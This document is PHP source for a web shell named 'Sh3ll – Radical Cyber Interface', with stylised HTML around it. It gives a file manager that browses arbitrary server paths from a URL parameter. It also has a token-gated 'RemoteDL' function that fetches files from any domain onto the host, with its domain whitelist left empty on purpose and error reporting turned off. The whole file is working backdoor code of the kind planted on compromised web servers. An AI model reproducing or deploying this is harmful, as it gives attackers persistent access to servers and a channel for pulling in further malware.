<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Sh3ll – Radical Cyber Interface</title>
<style>
body {
  background: radial-gradient(circle at top, #050013 0%, #02000a 100%);
  color: #d7d8f5;
  font-family: "JetBrains Mono", monospace;
  margin: 0;
  padding: 0;
}
a { color: #59d6ff; text-decoration: none; }
a:hover { color: #ae7bff; }

h3 {
  color: #bba8ff;
  text-shadow: 0 0 6px #7a4cff;
  font-weight: 600;
  margin: 8px 0;
}
table {
  width: 95%;
  border-collapse: collapse;
  margin: 20px auto;
  background: rgba(15,10,35,0.9);
  border: 1px solid rgba(110,80,255,0.3);
  border-radius: 6px;
  box-shadow: 0 0 15px rgba(110,60,255,0.3);
}
th {
  background: linear-gradient(90deg,#16003a,#0a001f);
  color: #aee7ff;
  padding: 10px;
  text-transform: uppercase;
  font-size: 13px;
}
td {
  padding: 8px 10px;
  border-top: 1px solid rgba(255,255,255,0.05);
  background: rgba(20,10,40,0.4);
  transition: background .2s ease;
}
tr:hover td {
  background: rgba(140,60,255,0.2);
  box-shadow: inset 0 0 8px rgba(160,90,255,0.3);
}
td font[color] { color: #00eaff !important; text-shadow: 0 0 4px #7f3aff; }

form {
  margin: 10px auto;
  background: rgba(25,10,45,0.6);
  padding: 12px;
  border-radius: 6px;
  width: fit-content;
  box-shadow: 0 0 10px rgba(130,70,255,0.3);
}
input, select, textarea {
  background: #0c0c18;
  color: #cce3ff;
  border: 1px solid rgba(160,90,255,0.4);
  border-radius: 5px;
  padding: 8px;
  font-family: inherit;
}
input[type=submit], .up, .gas {
  background: linear-gradient(180deg,#150035,#09001a);
  color: #cce8ff;
  border: 1px solid #7540ff;
  border-radius: 5px;
  padding: 6px 10px;
  cursor: pointer;
  text-shadow: 0 0 5px #6c3aff;
  transition: all .2s ease;
}
input[type=submit]:hover, .up:hover, .gas:hover {
  background: linear-gradient(180deg,#290090,#0b0033);
  box-shadow: 0 0 8px #8a50ff;
}
pre {
  background: #0a0616;
  color: #b5caff;
  padding: 10px;
  border-radius: 6px;
  overflow: auto;
  box-shadow: inset 0 0 10px rgba(150,80,255,0.3);
}
ul { list-style: none; text-align: center; padding: 0; margin: 15px 0; }
ul a { color: #ae7bff; }
.center { text-align: center; }
.footer { color:#888; text-align:center; margin:15px 0; font-size:13px; }
</style>
</head>
<body>
<?php
// ===== CONFIG =====
define('REMOTE_DL_TOKEN', 'dhiff_R4d1c@l_#2025');
$REMOTE_DL_WHITELIST = []; // kosong = semua domain diizinkan
set_time_limit(0);
error_reporting(0);

// ===== HELPERS =====
function green($t){echo "<center><span style='color:#0f0'>{$t}</span></center>";}
function red($t){echo "<center><span style='color:#f55'>{$t}</span></center>";}
function statusnya($f){$p=@fileperms($f);if($p===false)return'?';$s=[0xC000=>'s',0xA000=>'l',0x8000=>'-',0x4000=>'d',0x6000=>'b',0x2000=>'c',0x1000=>'p'];$t=$s[$p&0xF000]??'u';$map=[0x0100,0x0080,0x0040,0x0020,0x0010,0x0008,0x0004,0x0002,0x0001];foreach($map as $i=>$bit){$t.=($p&$bit)?(['r','w','x','r','w','x','r','w','x'][$i]):'-';}return$t;}
function xrmdir($d){$it=@scandir($d);if(!$it)return;foreach($it as $i){if($i=='.'||$i=='..')continue;$p=$d.'/'.$i;if(is_dir($p))xrmdir($p);else@unlink($p);}return@rmdir($d);}

// ===== REMOTE DOWNLOAD (auto to current dir) =====
function __download_secure($url,$optname=''){
    global $REMOTE_DL_WHITELIST;
    $base=getcwd();
    if(isset($GLOBALS['cwd'])&&is_dir($GLOBALS['cwd']))$base=$GLOBALS['cwd'];
    elseif(isset($GLOBALS['lokasi'])&&is_dir($GLOBALS['lokasi']))$base=$GLOBALS['lokasi'];
    if(!is_dir($base))return['ok'=>false,'err'=>'Invalid directory','path'=>null];
    if(!filter_var($url,FILTER_VALIDATE_URL))return['ok'=>false,'err'=>'Invalid URL','path'=>null];
    $host=parse_url($url,PHP_URL_HOST);
    if(!empty($REMOTE_DL_WHITELIST)){
        $allow=false;
        foreach($REMOTE_DL_WHITELIST as $d){if(stripos($host,$d)!==false){$allow=true;break;}}
        if(!$allow)return['ok'=>false,'err'=>'Blocked domain','path'=>null];
    }
    $basename=basename(parse_url($url,PHP_URL_PATH)??'file.bin');
    $basename=preg_replace('/[^A-Za-z0-9._-]/','_',$basename);
    $filename=$optname?preg_replace('/[^A-Za-z0-9._-]/','_',basename($optname)):$basename;
    $target=rtrim($base,'/')."/".$filename;
    $ok=false;$err='';
    if(function_exists('curl_init')){
        $ch=curl_init($url);
        $fp=@fopen($target,'w');
        if($fp){
            curl_setopt_array($ch,[CURLOPT_FILE=>$fp,CURLOPT_FOLLOWLOCATION=>1,CURLOPT_TIMEOUT=>90]);
            curl_exec($ch);
            $cerr=curl_error($ch);$code=curl_getinfo($ch,CURLINFO_HTTP_CODE);
            curl_close($ch);fclose($fp);
            if(!$cerr&&$code<400&&is_file($target))$ok=true;else{@unlink($target);$err=$cerr?:$code;}
        }else $err='Cannot write file';
    }
    if(!$ok){$d=@file_get_contents($url);if($d!==false&&@file_put_contents($target,$d)!==false)$ok=true;else$err=$err?:'Download failed';}
    if($ok)@chmod($target,0644);
    return['ok'=>$ok,'err'=>$err,'path'=>$target];
}

function alfaremotedl(){
  echo "<div style='background:#0b0b10;padding:14px;border-radius:8px;margin:15px auto;max-width:950px;color:#dff;box-shadow:0 0 10px rgba(110,70,255,0.3);'>";
  echo "<h3>Upload From URL (secure)</h3>";
  echo "<form method='post'>
      <label style='display:block;margin:6px 0;color:#9aa;'>Cmd (download &lt;url&gt; [filename])</label>
      <input type='text' name='cmd' placeholder='download https://site.tld/file.ext optional_name.ext'
        style='width:95%;max-width:900px;padding:10px 12px;border-radius:6px;background:#0b0b18;color:#bfefff;
        border:1px solid rgba(160,90,255,0.4);font-family:monospace;font-size:14px;' required>
      <input type='hidden' name='dl_token' value='".htmlspecialchars(REMOTE_DL_TOKEN)."'>
      <div style='margin-top:8px;'>
        <input type='submit' name='dl_submit' value='Download'>
      </div>
  </form>";
  if($_SERVER['REQUEST_METHOD']==='POST'&&isset($_POST['dl_submit'])){
      $cmd=trim($_POST['cmd']??'');$token=$_POST['dl_token']??'';
      echo "<div style='margin-top:10px;padding:8px;background:#090919;border-radius:4px;'>";
      if($token!==REMOTE_DL_TOKEN)echo"<div style='color:#f66'>Auth failed.</div>";
      else{
          $parts=preg_split('/\s+/',$cmd,3);
          if(count($parts)<2||strtolower($parts[0])!=='download')echo"<div style='color:#f66'>Use: download &lt;url&gt; [filename]</div>";
          else{$r=__download_secure($parts[1],$parts[2]??'');
              echo $r['ok']?"<div style='color:#6f6'>Success: ".htmlspecialchars($r['path'])."</div>":"<div style='color:#f66'>Error: ".htmlspecialchars($r['err'])."</div>";}
      }
      echo "</div>";
  }
  $dir=getcwd();
  echo "<div style='margin-top:10px;color:#888;font-size:12px;'>Current dir: ".htmlspecialchars($dir)."</div>";
  echo "</div>";
}

// ===== FILE MANAGER =====
$lokasi=isset($_GET['path'])?$_GET['path']:getcwd();
$lokasi=str_replace('\\','/',$lokasi);
$lokasis=@explode('/',$lokasi);
$lokasinya=@scandir($lokasi);
echo "<center><h2 style='color:#a96eff;text-shadow:0 0 8px #803fff;'>Sh3ll – Cyber Edition</h2></center>";
echo "<div class='center'>Directory: ";
foreach($lokasis as $i=>$l){if($l==''&&$i==0){echo"<a href='?path=/'>/</a>";continue;}
if($l=='')continue;echo"<a href='?path=";for($x=0;$x<=$i;$x++){echo rawurlencode($lokasis[$x]);if($x!=$i)echo"/";}echo"'>$l</a>/";}
echo "</div>";

echo "<ul><li>[ <a href='?'>Home</a> ] [ <a href='?act=remotedl'>RemoteDL</a> ]</li></ul>";

if(isset($_GET['act'])&&$_GET['act']==='remotedl'){alfaremotedl();exit;}

echo '<table><tr><th>Name</th><th>Size</th><th>Permissions</th><th>Options</th></tr>';
foreach($lokasinya as $f){
  if($f=='.'||$f=='..')continue;
  $path="$lokasi/$f";
  if(is_dir($path)){
      echo"<tr><td><a href='?path=".htmlspecialchars($path)."'>$f</a></td><td>--</td>
           <td><font>".statusnya($path)."</font></td><td><form method='POST'><select><option>--</option></select><input type='submit' class='gas' value='>'></form></td></tr>";
  } else {
      $size=@filesize($path)/1024;$s=($size>=1024?round($size/1024,2).' MB':round($size,2).' KB');
      echo"<tr><td><a href='?fileloc=".htmlspecialchars($path)."'>$f</a></td><td>$s</td>
           <td><font>".statusnya($path)."</font></td><td><form method='POST'><select><option>--</option></select><input type='submit' class='gas' value='>'></form></td></tr>";
  }
}
echo '</table>';
?>
</body>
</html>
